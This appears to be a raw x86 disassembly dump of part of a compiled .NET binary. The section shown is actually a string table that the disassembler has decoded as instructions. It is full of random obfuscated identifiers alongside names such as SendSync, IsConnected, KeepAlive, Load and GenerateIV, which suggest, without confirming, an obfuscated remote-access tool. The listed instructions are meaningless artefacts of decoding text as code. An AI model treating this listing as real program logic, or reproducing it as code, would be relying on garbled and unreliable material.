  408004:	53                   	push   %ebx
  408005:	00 52 6a             	add    %dl,0x6a(%edx)
  408008:	78 66                	js     0x408070
  40800a:	66 44                	inc    %sp
  40800c:	41                   	inc    %ecx
  40800d:	69 68 66 53 00 44 79 	imul   $0x79440053,0x66(%eax),%ebp
  408014:	41                   	inc    %ecx
  408015:	6b 49 68 63          	imul   $0x63,0x68(%ecx),%ecx
  408019:	4d                   	dec    %ebp
  40801a:	6a 53                	push   $0x53
  40801c:	00 71 76             	add    %dh,0x76(%ecx)
  40801f:	58                   	pop    %eax
  408020:	79 76                	jns    0x408098
  408022:	55                   	push   %ebp
  408023:	67 67 4c             	addr16 addr16 dec %esp
  408026:	41                   	inc    %ecx
  408027:	6a 4a                	push   $0x4a
  408029:	6d                   	insl   (%dx),%es:(%edi)
  40802a:	53                   	push   %ebx
  40802b:	00 52 63             	add    %dl,0x63(%edx)
  40802e:	61                   	popa
  40802f:	50                   	push   %eax
  408030:	56                   	push   %esi
  408031:	71 52                	jno    0x408085
  408033:	51                   	push   %ecx
  408034:	6c                   	insb   (%dx),%es:(%edi)
  408035:	4c                   	dec    %esp
  408036:	76 59                	jbe    0x408091
  408038:	45                   	inc    %ebp
  408039:	54                   	push   %esp
  40803a:	00 44 6e 4c          	add    %al,0x4c(%esi,%ebp,2)
  40803e:	75 70                	jne    0x4080b0
  408040:	45                   	inc    %ebp
  408041:	47                   	inc    %edi
  408042:	64 4f                	fs dec %edi
  408044:	4f                   	dec    %edi
  408045:	54                   	push   %esp
  408046:	00 4d 4c             	add    %cl,0x4c(%ebp)
  408049:	57                   	push   %edi
  40804a:	59                   	pop    %ecx
  40804b:	6b 73 4a 71          	imul   $0x71,0x4a(%ebx),%esi
  40804f:	6d                   	insl   (%dx),%es:(%edi)
  408050:	44                   	inc    %esp
  408051:	55                   	push   %ebp
  408052:	00 6b 6f             	add    %ch,0x6f(%ebx)
  408055:	54                   	push   %esp
  408056:	75 5a                	jne    0x4080b2
  408058:	42                   	inc    %edx
  408059:	4e                   	dec    %esi
  40805a:	64 76 48             	fs jbe 0x4080a5
  40805d:	6b 6a 69 7a          	imul   $0x7a,0x69(%edx),%ebp
  408061:	46                   	inc    %esi
  408062:	63 52 55             	arpl   %edx,0x55(%edx)
  408065:	00 4a 6d             	add    %cl,0x6d(%edx)
  408068:	61                   	popa
  408069:	7a 4c                	jp     0x4080b7
  40806b:	4d                   	dec    %ebp
  40806c:	50                   	push   %eax
  40806d:	4e                   	dec    %esi
  40806e:	71 55                	jno    0x4080c5
  408070:	55                   	push   %ebp
  408071:	00 57 52             	add    %dl,0x52(%edi)
  408074:	77 61                	ja     0x4080d7
  408076:	4c                   	dec    %esp
  408077:	4d                   	dec    %ebp
  408078:	78 79                	js     0x4080f3
  40807a:	45                   	inc    %ebp
  40807b:	5a                   	pop    %edx
  40807c:	50                   	push   %eax
  40807d:	4b                   	dec    %ebx
  40807e:	63 55 00             	arpl   %edx,0x0(%ebp)
  408081:	51                   	push   %ecx
  408082:	48                   	dec    %eax
  408083:	68 64 4c 79 55       	push   $0x55794c64
  408088:	6e                   	outsb  %ds:(%esi),(%dx)
  408089:	64 6c                	fs insb (%dx),%es:(%edi)
  40808b:	6a 78                	push   $0x78
  40808d:	55                   	push   %ebp
  40808e:	00 65 54             	add    %ah,0x54(%ebp)
  408091:	6f                   	outsl  %ds:(%esi),(%dx)
  408092:	42                   	inc    %edx
  408093:	4c                   	dec    %esp
  408094:	75 67                	jne    0x4080fd
  408096:	4d                   	dec    %ebp
  408097:	41                   	inc    %ecx
  408098:	56                   	push   %esi
  408099:	00 67 65             	add    %ah,0x65(%edi)
  40809c:	74 5f                	je     0x4080fd
  40809e:	49                   	dec    %ecx
  40809f:	56                   	push   %esi
  4080a0:	00 73 65             	add    %dh,0x65(%ebx)
  4080a3:	74 5f                	je     0x408104
  4080a5:	49                   	dec    %ecx
  4080a6:	56                   	push   %esi
  4080a7:	00 63 6d             	add    %ah,0x6d(%ebx)
  4080aa:	55                   	push   %ebp
  4080ab:	4e                   	dec    %esi
  4080ac:	71 44                	jno    0x4080f2
  4080ae:	67 6e                	outsb  %ds:(%si),(%dx)
  4080b0:	65 55                	gs push %ebp
  4080b2:	44                   	inc    %esp
  4080b3:	6a 63                	push   $0x63
  4080b5:	49                   	dec    %ecx
  4080b6:	56                   	push   %esi
  4080b7:	00 47 65             	add    %al,0x65(%edi)
  4080ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4080bb:	65 72 61             	gs jb  0x40811f
  4080be:	74 65                	je     0x408125
  4080c0:	49                   	dec    %ecx
  4080c1:	56                   	push   %esi
  4080c2:	00 4a 6a             	add    %cl,0x6a(%edx)
  4080c5:	67 48                	addr16 dec %eax
  4080c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4080c8:	73 7a                	jae    0x408144
  4080ca:	6b 7a 66 49          	imul   $0x49,0x66(%edx),%edi
  4080ce:	5a                   	pop    %edx
  4080cf:	4f                   	dec    %edi
  4080d0:	4c                   	dec    %esp
  4080d1:	56                   	push   %esi
  4080d2:	00 4a 76             	add    %cl,0x76(%edx)
  4080d5:	54                   	push   %esp
  4080d6:	4d                   	dec    %ebp
  4080d7:	46                   	inc    %esi
  4080d8:	69 69 64 61 56 00 75 	imul   $0x75005661,0x64(%ecx),%ebp
  4080df:	5a                   	pop    %edx
  4080e0:	43                   	inc    %ebx
  4080e1:	61                   	popa
  4080e2:	73 6e                	jae    0x408152
  4080e4:	77 66                	ja     0x40814c
  4080e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4080e7:	56                   	push   %esi
  4080e8:	00 70 7a             	add    %dh,0x7a(%eax)
  4080eb:	78 58                	js     0x408145
  4080ed:	4b                   	dec    %ebx
  4080ee:	54                   	push   %esp
  4080ef:	5a                   	pop    %edx
  4080f0:	4b                   	dec    %ebx
  4080f1:	68 6a 77 70 56       	push   $0x5670776a
  4080f6:	00 79 47             	add    %bh,0x47(%ecx)
  4080f9:	61                   	popa
  4080fa:	67 50                	addr16 push %eax
  4080fc:	65 41                	gs inc %ecx
  4080fe:	6c                   	insb   (%dx),%es:(%edi)
  4080ff:	52                   	push   %edx
  408100:	67 75 76             	addr16 jne 0x408179
  408103:	6f                   	outsl  %ds:(%esi),(%dx)
  408104:	68 46 57 00 6c       	push   $0x6c005746
  408109:	68 4b 73 43 7a       	push   $0x7a43734b
  40810e:	63 53 4e             	arpl   %edx,0x4e(%ebx)
  408111:	4b                   	dec    %ebx
  408112:	49                   	dec    %ecx
  408113:	57                   	push   %edi
  408114:	00 58 73             	add    %bl,0x73(%eax)
  408117:	43                   	inc    %ebx
  408118:	74 43                	je     0x40815d
  40811a:	49                   	dec    %ecx
  40811b:	51                   	push   %ecx
  40811c:	61                   	popa
  40811d:	52                   	push   %edx
  40811e:	42                   	inc    %edx
  40811f:	4a                   	dec    %edx
  408120:	57                   	push   %edi
  408121:	00 45 6a             	add    %al,0x6a(%ebp)
  408124:	7a 56                	jp     0x40817c
  408126:	4e                   	dec    %esi
  408127:	70 4c                	jo     0x408175
  408129:	4c                   	dec    %esp
  40812a:	55                   	push   %ebp
  40812b:	4c                   	dec    %esp
  40812c:	57                   	push   %edi
  40812d:	00 57 6c             	add    %dl,0x6c(%edi)
  408130:	51                   	push   %ecx
  408131:	57                   	push   %edi
  408132:	69 73 50 68 4d 58 4f 	imul   $0x4f584d68,0x50(%ebx),%esi
  408139:	58                   	pop    %eax
  40813a:	5a                   	pop    %edx
  40813b:	57                   	push   %edi
  40813c:	00 6b 4a             	add    %ch,0x4a(%ebx)
  40813f:	4c                   	dec    %esp
  408140:	57                   	push   %edi
  408141:	76 6e                	jbe    0x4081b1
  408143:	46                   	inc    %esi
  408144:	52                   	push   %edx
  408145:	65 57                	gs push %edi
  408147:	00 77 46             	add    %dh,0x46(%edi)
  40814a:	4f                   	dec    %edi
  40814b:	70 46                	jo     0x408193
  40814d:	55                   	push   %ebp
  40814e:	53                   	push   %ebx
  40814f:	66 64 4a             	fs dec %dx
  408152:	4b                   	dec    %ebx
  408153:	6d                   	insl   (%dx),%es:(%edi)
  408154:	57                   	push   %edi
  408155:	00 4f 48             	add    %cl,0x48(%edi)
  408158:	7a 75                	jp     0x4081cf
  40815a:	44                   	inc    %esp
  40815b:	6a 50                	push   $0x50
  40815d:	51                   	push   %ecx
  40815e:	4f                   	dec    %edi
  40815f:	48                   	dec    %eax
  408160:	76 57                	jbe    0x4081b9
  408162:	00 47 71             	add    %al,0x71(%edi)
  408165:	71 46                	jno    0x4081ad
  408167:	74 66                	je     0x4081cf
  408169:	65 64 59             	gs fs pop %ecx
  40816c:	70 52                	jo     0x4081c0
  40816e:	55                   	push   %ebp
  40816f:	62 44 58 00          	bound  %eax,0x0(%eax,%ebx,2)
  408173:	43                   	inc    %ebx
  408174:	51                   	push   %ecx
  408175:	71 6b                	jno    0x4081e2
  408177:	64 4b                	fs dec %ebx
  408179:	49                   	dec    %ecx
  40817a:	52                   	push   %edx
  40817b:	6f                   	outsl  %ds:(%esi),(%dx)
  40817c:	53                   	push   %ebx
  40817d:	58                   	pop    %eax
  40817e:	00 56 50             	add    %dl,0x50(%esi)
  408181:	53                   	push   %ebx
  408182:	74 75                	je     0x4081f9
  408184:	45                   	inc    %ebp
  408185:	5a                   	pop    %edx
  408186:	43                   	inc    %ebx
  408187:	4f                   	dec    %edi
  408188:	49                   	dec    %ecx
  408189:	55                   	push   %ebp
  40818a:	58                   	pop    %eax
  40818b:	00 74 4f 47          	add    %dh,0x47(%edi,%ecx,2)
  40818f:	79 71                	jns    0x408202
  408191:	75 61                	jne    0x4081f4
  408193:	47                   	inc    %edi
  408194:	75 67                	jne    0x4081fd
  408196:	56                   	push   %esi
  408197:	58                   	pop    %eax
  408198:	00 6b 5a             	add    %ch,0x5a(%ebx)
  40819b:	52                   	push   %edx
  40819c:	4b                   	dec    %ebx
  40819d:	47                   	inc    %edi
  40819e:	4b                   	dec    %ebx
  40819f:	67 52                	addr16 push %edx
  4081a1:	4d                   	dec    %ebp
  4081a2:	53                   	push   %ebx
  4081a3:	57                   	push   %edi
  4081a4:	58                   	pop    %eax
  4081a5:	00 50 4c             	add    %dl,0x4c(%eax)
  4081a8:	54                   	push   %esp
  4081a9:	54                   	push   %esp
  4081aa:	42                   	inc    %edx
  4081ab:	79 6d                	jns    0x40821a
  4081ad:	41                   	inc    %ecx
  4081ae:	69 58 58 00 67 78 75 	imul   $0x75786700,0x58(%eax),%ebx
  4081b5:	47                   	inc    %edi
  4081b6:	63 65 6d             	arpl   %esp,0x6d(%ebp)
  4081b9:	4d                   	dec    %ebp
  4081ba:	46                   	inc    %esi
  4081bb:	71 6a                	jno    0x408227
  4081bd:	5a                   	pop    %edx
  4081be:	58                   	pop    %eax
  4081bf:	00 45 61             	add    %al,0x61(%ebp)
  4081c2:	56                   	push   %esi
  4081c3:	72 58                	jb     0x40821d
  4081c5:	5a                   	pop    %edx
  4081c6:	72 6c                	jb     0x408234
  4081c8:	6d                   	insl   (%dx),%es:(%edi)
  4081c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ca:	58                   	pop    %eax
  4081cb:	00 58 45             	add    %bl,0x45(%eax)
  4081ce:	52                   	push   %edx
  4081cf:	6a 4a                	push   $0x4a
  4081d1:	56                   	push   %esi
  4081d2:	55                   	push   %ebp
  4081d3:	41                   	inc    %ecx
  4081d4:	53                   	push   %ebx
  4081d5:	51                   	push   %ecx
  4081d6:	53                   	push   %ebx
  4081d7:	73 74                	jae    0x40824d
  4081d9:	58                   	pop    %eax
  4081da:	00 61 6e             	add    %ah,0x6e(%ecx)
  4081dd:	6a 59                	push   $0x59
  4081df:	59                   	pop    %ecx
  4081e0:	46                   	inc    %esi
  4081e1:	41                   	inc    %ecx
  4081e2:	54                   	push   %esp
  4081e3:	52                   	push   %edx
  4081e4:	77 78                	ja     0x40825e
  4081e6:	58                   	pop    %eax
  4081e7:	00 4b 6a             	add    %cl,0x6a(%ebx)
  4081ea:	70 53                	jo     0x40823f
  4081ec:	41                   	inc    %ecx
  4081ed:	4b                   	dec    %ebx
  4081ee:	57                   	push   %edi
  4081ef:	63 6f 48             	arpl   %ebp,0x48(%edi)
  4081f2:	4d                   	dec    %ebp
  4081f3:	45                   	inc    %ebp
  4081f4:	59                   	pop    %ecx
  4081f5:	00 72 53             	add    %dh,0x53(%edx)
  4081f8:	48                   	dec    %eax
  4081f9:	42                   	inc    %edx
  4081fa:	6b 67 66 51          	imul   $0x51,0x66(%edi),%esp
  4081fe:	4a                   	dec    %edx
  4081ff:	59                   	pop    %ecx
  408200:	00 67 50             	add    %ah,0x50(%edi)
  408203:	78 75                	js     0x40827a
  408205:	58                   	pop    %eax
  408206:	47                   	inc    %edi
  408207:	6c                   	insb   (%dx),%es:(%edi)
  408208:	4d                   	dec    %ebp
  408209:	6f                   	outsl  %ds:(%esi),(%dx)
  40820a:	6e                   	outsb  %ds:(%esi),(%dx)
  40820b:	46                   	inc    %esi
  40820c:	70 66                	jo     0x408274
  40820e:	59                   	pop    %ecx
  40820f:	00 52 79             	add    %dl,0x79(%edx)
  408212:	64 45                	fs inc %ebp
  408214:	59                   	pop    %ecx
  408215:	61                   	popa
  408216:	66 41                	inc    %cx
  408218:	43                   	inc    %ebx
  408219:	67 47                	addr16 inc %edi
  40821b:	48                   	dec    %eax
  40821c:	62 6c 59 00          	bound  %ebp,0x0(%ecx,%ebx,2)
  408220:	48                   	dec    %eax
  408221:	58                   	pop    %eax
  408222:	62 69 71             	bound  %ebp,0x71(%ecx)
  408225:	45                   	inc    %ebp
  408226:	6d                   	insl   (%dx),%es:(%edi)
  408227:	67 75 59             	addr16 jne 0x408283
  40822a:	00 41 41             	add    %al,0x41(%ecx)
  40822d:	51                   	push   %ecx
  40822e:	55                   	push   %ebp
  40822f:	72 46                	jb     0x408277
  408231:	61                   	popa
  408232:	59                   	pop    %ecx
  408233:	5a                   	pop    %edx
  408234:	63 56 4e             	arpl   %edx,0x4e(%esi)
  408237:	42                   	inc    %edx
  408238:	5a                   	pop    %edx
  408239:	00 45 4d             	add    %al,0x4d(%ebp)
  40823c:	75 46                	jne    0x408284
  40823e:	62 51 77             	bound  %edx,0x77(%ecx)
  408241:	55                   	push   %ebp
  408242:	76 7a                	jbe    0x4082be
  408244:	47                   	inc    %edi
  408245:	5a                   	pop    %edx
  408246:	00 4f 45             	add    %cl,0x45(%edi)
  408249:	44                   	inc    %esp
  40824a:	6b 7a 41 78          	imul   $0x78,0x41(%edx),%edi
  40824e:	79 58                	jns    0x4082a8
  408250:	4b                   	dec    %ebx
  408251:	71 41                	jno    0x408294
  408253:	4e                   	dec    %esi
  408254:	5a                   	pop    %edx
  408255:	00 43 67             	add    %al,0x67(%ebx)
  408258:	6e                   	outsb  %ds:(%esi),(%dx)
  408259:	75 48                	jne    0x4082a3
  40825b:	62 49 66             	bound  %ecx,0x66(%ecx)
  40825e:	42                   	inc    %edx
  40825f:	53                   	push   %ebx
  408260:	58                   	pop    %eax
  408261:	5a                   	pop    %edx
  408262:	00 6c 6d 45          	add    %ch,0x45(%ebp,%ebp,2)
  408266:	4c                   	dec    %esp
  408267:	77 44                	ja     0x4082ad
  408269:	6b 6f 59 6f          	imul   $0x6f,0x59(%edi),%ebp
  40826d:	6d                   	insl   (%dx),%es:(%edi)
  40826e:	71 61                	jno    0x4082d1
  408270:	5a                   	pop    %edx
  408271:	00 4b 41             	add    %cl,0x41(%ebx)
  408274:	57                   	push   %edi
  408275:	54                   	push   %esp
  408276:	6c                   	insb   (%dx),%es:(%edi)
  408277:	6a 47                	push   $0x47
  408279:	54                   	push   %esp
  40827a:	65 61                	gs popa
  40827c:	71 6d                	jno    0x4082eb
  40827e:	5a                   	pop    %edx
  40827f:	00 72 59             	add    %dh,0x59(%edx)
  408282:	6d                   	insl   (%dx),%es:(%edi)
  408283:	69 6c 4f 42 6b 79 69 	imul   $0x4769796b,0x42(%edi,%ecx,2),%ebp
  40828a:	47 
  40828b:	6f                   	outsl  %ds:(%esi),(%dx)
  40828c:	5a                   	pop    %edx
  40828d:	00 76 61             	add    %dh,0x61(%esi)
  408290:	6c                   	insb   (%dx),%es:(%edi)
  408291:	75 65                	jne    0x4082f8
  408293:	5f                   	pop    %edi
  408294:	5f                   	pop    %edi
  408295:	00 46 63             	add    %al,0x63(%esi)
  408298:	62 4a 6b             	bound  %ecx,0x6b(%edx)
  40829b:	78 52                	js     0x4082ef
  40829d:	4f                   	dec    %edi
  40829e:	53                   	push   %ebx
  40829f:	45                   	inc    %ebp
  4082a0:	61                   	popa
  4082a1:	00 79 61             	add    %bh,0x61(%ecx)
  4082a4:	71 50                	jno    0x4082f6
  4082a6:	50                   	push   %eax
  4082a7:	4f                   	dec    %edi
  4082a8:	49                   	dec    %ecx
  4082a9:	73 77                	jae    0x408322
  4082ab:	51                   	push   %ecx
  4082ac:	54                   	push   %esp
  4082ad:	5a                   	pop    %edx
  4082ae:	74 61                	je     0x408311
  4082b0:	00 62 45             	add    %ah,0x45(%edx)
  4082b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b4:	7a 6f                	jp     0x408325
  4082b6:	44                   	inc    %esp
  4082b7:	57                   	push   %edi
  4082b8:	46                   	inc    %esi
  4082b9:	74 54                	je     0x40830f
  4082bb:	65 73 76             	gs jae 0x408334
  4082be:	61                   	popa
  4082bf:	00 4c 68 77          	add    %cl,0x77(%eax,%ebp,2)
  4082c3:	52                   	push   %edx
  4082c4:	6d                   	insl   (%dx),%es:(%edi)
  4082c5:	58                   	pop    %eax
  4082c6:	42                   	inc    %edx
  4082c7:	72 6d                	jb     0x408336
  4082c9:	72 78                	jb     0x408343
  4082cb:	61                   	popa
  4082cc:	00 4c 44 71          	add    %cl,0x71(%esp,%eax,2)
  4082d0:	57                   	push   %edi
  4082d1:	69 47 4a 50 57 49 62 	imul   $0x62495750,0x4a(%edi),%eax
  4082d8:	00 56 62             	add    %dl,0x62(%esi)
  4082db:	50                   	push   %eax
  4082dc:	72 4f                	jb     0x40832d
  4082de:	63 62 41             	arpl   %esp,0x41(%edx)
  4082e1:	44                   	inc    %esp
  4082e2:	79 4d                	jns    0x408331
  4082e4:	4d                   	dec    %ebp
  4082e5:	62 00                	bound  %eax,(%eax)
  4082e7:	68 45 71 78 68       	push   $0x68787145
  4082ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ed:	50                   	push   %eax
  4082ee:	4c                   	dec    %esp
  4082ef:	67 47                	addr16 inc %edi
  4082f1:	55                   	push   %ebp
  4082f2:	62 00                	bound  %eax,(%eax)
  4082f4:	52                   	push   %edx
  4082f5:	77 54                	ja     0x40834b
  4082f7:	4b                   	dec    %ebx
  4082f8:	66 47                	inc    %di
  4082fa:	51                   	push   %ecx
  4082fb:	62 46 67             	bound  %eax,0x67(%esi)
  4082fe:	74 62                	je     0x408362
  408300:	62 00                	bound  %eax,(%eax)
  408302:	42                   	inc    %edx
  408303:	7a 62                	jp     0x408367
  408305:	4c                   	dec    %esp
  408306:	46                   	inc    %esi
  408307:	79 66                	jns    0x40836f
  408309:	62 72 76             	bound  %esi,0x76(%edx)
  40830c:	55                   	push   %ebp
  40830d:	59                   	pop    %ecx
  40830e:	66 62 00             	bound  %ax,(%eax)
  408311:	6d                   	insl   (%dx),%es:(%edi)
  408312:	73 63                	jae    0x408377
  408314:	6f                   	outsl  %ds:(%esi),(%dx)
  408315:	72 6c                	jb     0x408383
  408317:	69 62 00 79 78 48 59 	imul   $0x59487879,0x0(%edx),%esp
  40831e:	44                   	inc    %esp
  40831f:	5a                   	pop    %edx
  408320:	6d                   	insl   (%dx),%es:(%edi)
  408321:	4e                   	dec    %esi
  408322:	4f                   	dec    %edi
  408323:	4e                   	dec    %esi
  408324:	72 62                	jb     0x408388
  408326:	00 72 74             	add    %dh,0x74(%edx)
  408329:	45                   	inc    %ebp
  40832a:	71 54                	jno    0x408380
  40832c:	64 66 74 46          	fs data16 je 0x408376
  408330:	55                   	push   %ebp
  408331:	63 00                	arpl   %eax,(%eax)
  408333:	44                   	inc    %esp
  408334:	63 7a 71             	arpl   %edi,0x71(%edx)
  408337:	51                   	push   %ecx
  408338:	6d                   	insl   (%dx),%es:(%edi)
  408339:	59                   	pop    %ecx
  40833a:	68 4c 56 63 00       	push   $0x63564c
  40833f:	54                   	push   %esp
  408340:	57                   	push   %edi
  408341:	49                   	dec    %ecx
  408342:	59                   	pop    %ecx
  408343:	72 4d                	jb     0x408392
  408345:	68 50 72 6d 6b       	push   $0x6b6d7250
  40834a:	71 79                	jno    0x4083c5
  40834c:	57                   	push   %edi
  40834d:	63 00                	arpl   %eax,(%eax)
  40834f:	69 72 6b 4e 55 73 53 	imul   $0x5373554e,0x6b(%edx),%esi
  408356:	64 79 70             	fs jns 0x4083c9
  408359:	71 62                	jno    0x4083bd
  40835b:	63 00                	arpl   %eax,(%eax)
  40835d:	59                   	pop    %ecx
  40835e:	4f                   	dec    %edi
  40835f:	48                   	dec    %eax
  408360:	65 52                	gs push %edx
  408362:	59                   	pop    %ecx
  408363:	43                   	inc    %ebx
  408364:	77 64                	ja     0x4083ca
  408366:	63 00                	arpl   %eax,(%eax)
  408368:	53                   	push   %ebx
  408369:	79 73                	jns    0x4083de
  40836b:	74 65                	je     0x4083d2
  40836d:	6d                   	insl   (%dx),%es:(%edi)
  40836e:	2e 43                	cs inc %ebx
  408370:	6f                   	outsl  %ds:(%esi),(%dx)
  408371:	6c                   	insb   (%dx),%es:(%edi)
  408372:	6c                   	insb   (%dx),%es:(%edi)
  408373:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408378:	6e                   	outsb  %ds:(%esi),(%dx)
  408379:	73 2e                	jae    0x4083a9
  40837b:	47                   	inc    %edi
  40837c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40837e:	65 72 69             	gs jb  0x4083ea
  408381:	63 00                	arpl   %eax,(%eax)
  408383:	4d                   	dec    %ebp
  408384:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40838b:	74 2e                	je     0x4083bb
  40838d:	56                   	push   %esi
  40838e:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408395:	73 69                	jae    0x408400
  408397:	63 00                	arpl   %eax,(%eax)
  408399:	56                   	push   %esi
  40839a:	77 47                	ja     0x4083e3
  40839c:	44                   	inc    %esp
  40839d:	41                   	inc    %ecx
  40839e:	41                   	inc    %ecx
  40839f:	47                   	inc    %edi
  4083a0:	66 4d                	dec    %bp
  4083a2:	64 6d                	fs insl (%dx),%es:(%edi)
  4083a4:	74 4b                	je     0x4083f1
  4083a6:	6c                   	insb   (%dx),%es:(%edi)
  4083a7:	63 00                	arpl   %eax,(%eax)
  4083a9:	67 65 74 5f          	addr16 gs je 0x40840c
  4083ad:	53                   	push   %ebx
  4083ae:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083b0:	64 53                	fs push %ebx
  4083b2:	79 6e                	jns    0x408422
  4083b4:	63 00                	arpl   %eax,(%eax)
  4083b6:	72 63                	jb     0x40841b
  4083b8:	61                   	popa
  4083b9:	4e                   	dec    %esi
  4083ba:	44                   	inc    %esp
  4083bb:	5a                   	pop    %edx
  4083bc:	43                   	inc    %ebx
  4083bd:	4c                   	dec    %esp
  4083be:	75 42                	jne    0x408402
  4083c0:	4d                   	dec    %ebp
  4083c1:	42                   	inc    %edx
  4083c2:	73 63                	jae    0x408427
  4083c4:	00 74 62 5a          	add    %dh,0x5a(%edx,%eiz,2)
  4083c8:	63 48 49             	arpl   %ecx,0x49(%eax)
  4083cb:	77 7a                	ja     0x408447
  4083cd:	68 61 75 65 69       	push   $0x69657561
  4083d2:	48                   	dec    %eax
  4083d3:	64 00 56 47          	add    %dl,%fs:0x47(%esi)
  4083d7:	50                   	push   %eax
  4083d8:	62 56 45             	bound  %edx,0x45(%esi)
  4083db:	69 76 67 52 4a 4c 4b 	imul   $0x4b4c4a52,0x67(%esi),%esi
  4083e2:	64 00 75 6c          	add    %dh,%fs:0x6c(%ebp)
  4083e6:	54                   	push   %esp
  4083e7:	42                   	inc    %edx
  4083e8:	53                   	push   %ebx
  4083e9:	65 68 6d 4e 75 4c    	gs push $0x4c754e6d
  4083ef:	64 00 69 6e          	add    %ch,%fs:0x6e(%ecx)
  4083f3:	64 4f                	fs dec %edi
  4083f5:	66 44                	inc    %sp
  4083f7:	6b 6b 66 4d          	imul   $0x4d,0x66(%ebx),%ebp
  4083fb:	64 00 6f 62          	add    %ch,%fs:0x62(%edi)
  4083ff:	4f                   	dec    %edi
  408400:	53                   	push   %ebx
  408401:	74 4b                	je     0x40844e
  408403:	69 79 51 52 46 50 64 	imul   $0x64504652,0x51(%ecx),%edi
  40840a:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  40840e:	58                   	pop    %eax
  40840f:	52                   	push   %edx
  408410:	48                   	dec    %eax
  408411:	6d                   	insl   (%dx),%es:(%edi)
  408412:	44                   	inc    %esp
  408413:	53                   	push   %ebx
  408414:	64 00 56 6c          	add    %dl,%fs:0x6c(%esi)
  408418:	69 50 62 41 44 75 62 	imul   $0x62754441,0x62(%eax),%edx
  40841f:	54                   	push   %esp
  408420:	55                   	push   %ebp
  408421:	5a                   	pop    %edx
  408422:	53                   	push   %ebx
  408423:	64 00 56 74          	add    %dl,%fs:0x74(%esi)
  408427:	43                   	inc    %ebx
  408428:	73 70                	jae    0x40849a
  40842a:	61                   	popa
  40842b:	70 6e                	jo     0x40849b
  40842d:	53                   	push   %ebx
  40842e:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408432:	64 52                	fs push %edx
  408434:	65 61                	gs popa
  408436:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40843a:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408441:	00 
  408442:	54                   	push   %esp
  408443:	68 72 65 61 64       	push   $0x64616572
  408448:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40844c:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  408450:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  408454:	41                   	inc    %ecx
  408455:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40845b:	61                   	popa
  40845c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  408462:	74 5f                	je     0x4084c3
  408464:	43                   	inc    %ebx
  408465:	6f                   	outsl  %ds:(%esi),(%dx)
  408466:	6e                   	outsb  %ds:(%esi),(%dx)
  408467:	6e                   	outsb  %ds:(%esi),(%dx)
  408468:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40846d:	00 67 65             	add    %ah,0x65(%edi)
  408470:	74 5f                	je     0x4084d1
  408472:	49                   	dec    %ecx
  408473:	73 43                	jae    0x4084b8
  408475:	6f                   	outsl  %ds:(%esi),(%dx)
  408476:	6e                   	outsb  %ds:(%esi),(%dx)
  408477:	6e                   	outsb  %ds:(%esi),(%dx)
  408478:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40847d:	00 73 65             	add    %dh,0x65(%ebx)
  408480:	74 5f                	je     0x4084e1
  408482:	49                   	dec    %ecx
  408483:	73 43                	jae    0x4084c8
  408485:	6f                   	outsl  %ds:(%esi),(%dx)
  408486:	6e                   	outsb  %ds:(%esi),(%dx)
  408487:	6e                   	outsb  %ds:(%esi),(%dx)
  408488:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40848d:	00 78 47             	add    %bh,0x47(%eax)
  408490:	4b                   	dec    %ebx
  408491:	52                   	push   %edx
  408492:	64 69 78 56 77 58 64 	imul   $0x42645877,%fs:0x56(%eax),%edi
  408499:	42 
  40849a:	68 64 00 67 65       	push   $0x65670064
  40849f:	74 5f                	je     0x408500
  4084a1:	47                   	inc    %edi
  4084a2:	75 69                	jne    0x40850d
  4084a4:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4084a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084aa:	64 53                	fs push %ebx
  4084ac:	79 6e                	jns    0x40851c
  4084ae:	63 3e                	arpl   %edi,(%esi)
  4084b0:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084b4:	61                   	popa
  4084b5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084b9:	67 46                	addr16 inc %esi
  4084bb:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4084c2:	73 43                	jae    0x408507
  4084c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4084c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c7:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4084cc:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4084d1:	61                   	popa
  4084d2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d6:	67 46                	addr16 inc %esi
  4084d8:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4084df:	65 65 70 41          	gs gs jo 0x408524
  4084e3:	6c                   	insb   (%dx),%es:(%edi)
  4084e4:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4084eb:	42                   	inc    %edx
  4084ec:	61                   	popa
  4084ed:	63 6b 69             	arpl   %ebp,0x69(%ebx)
